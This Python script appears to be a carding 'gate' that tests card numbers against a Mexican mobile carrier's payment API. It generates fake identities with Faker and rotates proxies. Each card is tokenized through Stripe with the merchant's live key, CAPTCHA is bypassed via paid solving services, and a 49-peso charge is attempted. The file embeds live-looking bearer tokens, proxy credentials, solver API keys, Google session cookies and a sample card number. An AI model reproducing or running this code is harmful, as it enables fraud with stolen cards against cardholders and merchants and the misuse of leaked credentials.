from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import Tk, filedialog
from httpx import request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper
from anticaptchaofficial.recaptchav2proxyless import *
import time


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')



def resolver_recaptcha(api_key, website_url, website_key):
    solver = recaptchaV2Proxyless()
    solver.set_verbose(1)
    solver.set_key(api_key)
    solver.set_website_url(website_url)
    solver.set_website_key(website_key)

    g_response = solver.solve_and_return_solution()
    if g_response != 0:
        print("✅ Captcha resuelto:", g_response)
        return g_response
    else:
        print("❌ Error al resolver captcha:", solver.error_code)
        return None
def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c =  requests.Session()
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']

            #============[Requests 1]============#

            correos = [
                "marilisaqnituk@gmail.com",
                "flortsquitk@gmail.com",
                "quitukferchag@gmail.com",
                "saramanquitk@gmail.com",
                "jorgaioquint@gmail.com",
                "rodrigoking234@gmail.com",
                "rodrigoquituk004@gmail.com",
                "armeida.cate771@gmail.com",
                "viquitukeliander@gmail.com",
                "quityksantome@gmail.com",
                "samanquitguajal@gmail.com",
                "quintkdelgelo@gmail.com",
                "squitukjomilu@gmail.com",
                "lauranquinyuk@gmail.com",
                "rodrigoqgomez@gmail.com",
                "gardunoerick2@gmail.com"
            ]

            correo_seleccionado = random.choice(correos)
            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-MX;q=0.4',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
            }

            params = {
                'msisdn': '5642378421',
            }

            response = c.get('https://redphone.api.koonolmexico.com/altan_services/validate', params=params, headers=headers)
            responsePm = json.loads(response.text)
            tokenop = responsePm['altan_service']['id']
            userid=responsePm['altan_service']['user']['id']

            print(userid)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-MX;q=0.4',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
            }

            data = {
                f'payment_rate_limit_event_log[altan_service_id]': tokenop,
                'payment_rate_limit_event_log[blocked_reason]': 'multiple_failed_attempts',
                'payment_rate_limit_event_log[send_sms]': 'true',
            }

            response = c.post(
                'https://redphone.api.koonolmexico.com/payment_rate_limit_event_logs/validate',
                headers=headers,
                data=data,
            )
            
            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-MX;q=0.4',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
            }

            params = {
                'id': userid,
            }

            response = c.get('https://redphone.api.koonolmexico.com/users/138290', params=params, headers=headers)

            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
            }

            data = f'time_on_page=3295327&pasted_fields=number&guid=1664b51c-68c6-4625-b597-e5aadd02167a99ca4a&muid=3aa6840e-bd92-4303-96f1-43c5b03de2b723907c&sid=61251c89-a2d4-471e-a531-ec207bb70e6b58223d&key=pk_live_51KOX42AMlS3RZFNSs08ALhGLqQIZ8hZLlEkBxYlxQo6aJlEcz442oQ7L9Eejs7niMHf6PKYGofk0jIMB78ubKt6D00qp0QZjLC&payment_user_agent=stripe.js%2F78ef418&card[number]={cc_number}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano_number}'

            response = c.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
            responsePm = json.loads(response.text)
            tokenst = responsePm['id']
            print(tokenst)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-MX;q=0.4',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
            }

            data = {
                'payment_card[is_default]': 'false',
                'payment_card[stripe_token]': tokenst,
                'user_id': userid,
            }

            response = c.post('https://redphone.api.koonolmexico.com/payment_cards', headers=headers, data=data)
            responsePm = json.loads(response.text)
            payment_id = responsePm['payment_card']['id']
           
            print(payment_id)

            API_KEY = "bf5a65205366ac960191fd60de67463d"
            SITE_KEY = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"
            URL_OBJETIVO = "https://micuenta.redphone.com.mx/"
            

            # Tu API key de CapMonster
            api_key = "15a7d37c2e38321b89c6f9ac050f5b1c"

            # Sitio donde está el reCAPTCHA
            website_url = "https://micuenta.redphone.com.mx/"

            # Sitekey extraído del HTML del sitio (en el <div class="g-recaptcha" data-sitekey="...">)
            sitekey = "6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll"

            # Paso 1: Crear la tarea
            create_task_payload = {
                "clientKey": api_key,
                "task": {
                    "type": "NoCaptchaTaskProxyless",  # No usas proxy
                    "websiteURL": website_url,
                    "websiteKey": sitekey
                }
            }

            print("📤 Enviando captcha a CapMonster...")

            response = requests.post("https://api.capmonster.cloud/createTask", json=create_task_payload)
            result = response.json()

            if result.get("errorId") != 0:
                print("❌ Error al crear tarea:", result.get("errorCode"))
                exit()

            task_id = result["taskId"]
            print("🆔 Tarea creada con ID:", task_id)

            # Paso 2: Consultar la solución
            get_result_payload = {
                "clientKey": api_key,
                "taskId": task_id
            }

            for i in range(20):
                time.sleep(5)  # espera entre intentos
                res = requests.post("https://api.capmonster.cloud/getTaskResult", json=get_result_payload)
                res_json = res.json()

                if res_json.get("status") == "ready":
                    token = res_json["solution"]["gRecaptchaResponse"]
                    print("✅ CAPTCHA resuelto con éxito.")
                   
                    break
                else:
                    print(f"⏳ Esperando respuesta ({i+1}/20)...")

            else:
                print("❌ Tiempo de espera agotado.")

            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-MX;q=0.4',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'origin': 'https://www.google.com',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://www.google.com/recaptcha/api2/bframe?hl=es-419&v=ngcIAHyEnHQZZIKkyKneDTW3&k=6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-storage-access': 'active',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
                # 'cookie': '__Secure-3PAPISID=y1M53iuUdgiNKahY/AUrz6uD3u5Ltk4VQs; __Secure-3PSIDTS=sidts-CjIB5H03P258ZauLBR3iF06PY08voHTzrlO7wb9kvB1jNQQuZlk5wZU2KJlSYGzRMwDxYhAA; __Secure-3PSID=g.a000zgidsiJ7IjlCH_Q6sv81lotzZgpKz1-2Xjm3yH1bvGim_DkfAkkHs8g0HkDw088rTmd31wACgYKAU8SARMSFQHGX2Mia3kVN_8L7bCilgU5y30LiBoVAUF8yKrEy3tkTQQkuDHC7qp-2c3A0076; NID=525=BZYBXI3JnJlXF2lTWLcnBWkNZMyTr5SPRWxTu2zMNbE3DA3rARsWUeoPrjlcorQdQXlZxTo-VTkvq34toMxj_VumXRZObeNS5dHqhJSwUksWY9wxOshxXj9kn6FBKvod4rbjd_jszvk5fhCdTB3oATjaAm334V3OatRCoV7ceypP116D3wvq5qWFWi-Cx744q3eiLtV21CFyo5FR9xIHa5bMkn-qy2UHawsq4sHI3Cr0Ph5d61pqZzr2d1HuhV1US-2ommj9ESE1yQPnij2Bs_gZ7mjHA2VfOa26XHSx9EgplVui0KazHz5X1eu8qVl0PKTIzCCXwS2QlfEY4T5oMFdt4WCeSj65NN6sb9tRkEGW_laEblXsrZg0hT44bV0A5pXvUCqHmcl35EMTH7XHC2PGadBgIkH-j9A57rgN2RCtgPak1VVrKQNUW7ebbYh1yfDeTWdauhEtCIWrYMuAXJHy4nc_spq1uX1PUbPP-a1wu_wnxWaPzXWekB1yp-BiqROkJhZJf3YFhotnh-exqXKfT_DxS-CY1AzRqvX2kKQ9j3rDnLTXBA8IXD-zgnlrXrrg5mXXHXVStXKNmZqIH7BaWZHCfOWpzlyYiwqiIZDSvgGiWAMqlaMXfJ2liHsDZZrM6RkaNm-TwS-PCddpvvbbXaM_W37y3yNsWbfjwvwBNHK7uWWiGoGrSvk09eXvTtnFedbmqpfIX2OKFPvNmZhtAAPHJdn6K1_46L5KI2_o6l8o4ASXOcalINoisrvPFFo4TLXfRcMbU1KDsZPPKF4oNg5n4Jb3wY1HXEtMDSac8MbcycU9rLBhxrDBsGHlwGY4KqMqGoQKZYBW6oXnvKQMkgTKEKiobqQHbf34SlqMC3drX7AeJXxsvyV5JGL4n9NGTK_3XFJ6X_CFWurO1RF3a-w-j91wrE3RA3yD5Dhze5gcyGHsihMHOdOl0qtxI2L2hiuoMz9EENjtaUIldpaTux6WJrQew9tu25hiroNlcnGp8nhIkQWdrgfM13_H51U_t3XmuRSGTr0o3tmEgz5lr3tX96F6MUTVgjBJV0ovyZb4uqobApE20OSxsSrURqiSWD9fkfecxnIxTzTiHOhJhy_ldjAiLDk0gPUNO-MpZx9PMgtCX7k8Yg-BtyOFp2M7M6_LXBnWbzvTLye1kpA0SV7VmkHNK9BV8MA; __Secure-3PSIDCC=AKEyXzU-mf1U4MxBHEeo0F5ZZzDQf7yIgjr67Lre0wmXyEBxUrgna_RVOAVCfn9xVqR0hGv94oRL',
            }

            params = {
                'k': '6LeRoVMUAAAAAGvv93qaFm8mOppFzZsq_FKIgHll',
            }

            data = f'v=ngcIAHyEnHQZZIKkyKneDTW3&c={token}'

            response = c.post(
                'https://www.google.com/recaptcha/api2/userverify',
                params=params,
                headers=headers,
                data=data,
            )


            headers = {
                'accept': '*/*',
                'accept-language': 'es-419,es;q=0.9,es-ES;q=0.8,en;q=0.7,en-GB;q=0.6,en-US;q=0.5,es-MX;q=0.4',
                'authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.eyJhcGlfaWQiOiJmZWNkYzcwNi1lNjVlLTQxM2YtOTI0Mi0yNTQwN2MyMTYyYzgifQ.GZlcAa4ZWFg6jRGJQJ36NjvlhUsT_UNNrNHvQyqxLGI',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://micuenta.redphone.com.mx',
                'pragma': 'no-cache',
                'priority': 'u=1, i',
                'referer': 'https://micuenta.redphone.com.mx/',
                'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Microsoft Edge";v="138"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'cross-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0',
            }

            data = {
                'offering_id': '157',
                'is_multiple_activation': 'true',
                'google_recaptcha_token': token,
                'kushki_token': '',
                'create_payment': 'true',
                'payment[amount]': '49',
                'payment[payment_method]': 'card',
                'payment[payment_gateway_data]': '49',
                'payment[payment_gateway_id]': '',
                'payment_card_id': '276130',
            }

            response = c.post(
                'https://redphone.api.koonolmexico.com/v2/altan_services/122011/supplementary_offering',
                headers=headers,
                data=data,
            )
            responsePm = json.loads(response.text)
            
           
            print(responsePm)


            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5101256507688229|05|2032|948"))